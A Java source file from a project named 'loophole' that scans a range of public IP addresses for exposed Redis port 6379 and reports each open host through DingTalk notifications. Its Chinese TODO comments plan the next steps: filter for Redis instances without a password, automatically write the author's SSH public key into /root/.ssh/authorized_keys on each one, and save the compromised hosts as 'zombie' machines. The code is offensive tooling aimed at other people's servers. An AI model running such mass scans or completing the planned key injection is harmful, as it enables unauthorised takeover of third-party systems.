package com.aoshiguchen.loophole;

import com.aoshiguchen.loophole.core.dto.IpSegment;
import com.aoshiguchen.loophole.core.dto.Ipv4;
import com.aoshiguchen.loophole.core.dto.Ipv4Segment;
import com.aoshiguchen.loophole.core.foundation.Foundation;

import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;

/**
 * TODO
 * Author: yangwen
 * Date:  2019/5/29
 */
public class Main {

    private static volatile long count = 0;

    // TODO 扫描指定范围的公网ip，发现有暴露redis默认端口且未设置认证密码的ip，保存入文件当中，并且发送钉钉通知
    // TODO 然后自动执行脚本，一键将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 文件里
    // TODO 保存所有的肉鸡ip，并发送钉钉通知
    public static void main(String[] args) throws Exception {
        Foundation.ipv4().ergodicPublicNetworkIp("110.31.0.0","110.40.255.255", // 设置扫描ip段
                ipv4 ->  check(ipv4.getString(),6379,200), // 过滤暴露6379外网端口的ip
                (ipv4,progress) -> System.out.println(progress + "%")    // 输出扫描进度
                ,ipv4 -> {
                System.out.println(ipv4);   // 输出符合要求的ip
                Foundation.ding().notice(ipv4.getString()); // 发送钉钉通知
        });
    }

    private static boolean check(String ip,int port,int timeout){
        boolean result = false;

        try{
            Socket socket = new Socket();
            SocketAddress socketAddress = new InetSocketAddress(ip, port);
            socket.connect(socketAddress,timeout);
            return true;
        }catch (Exception e){

        }

        return result;
    }

}
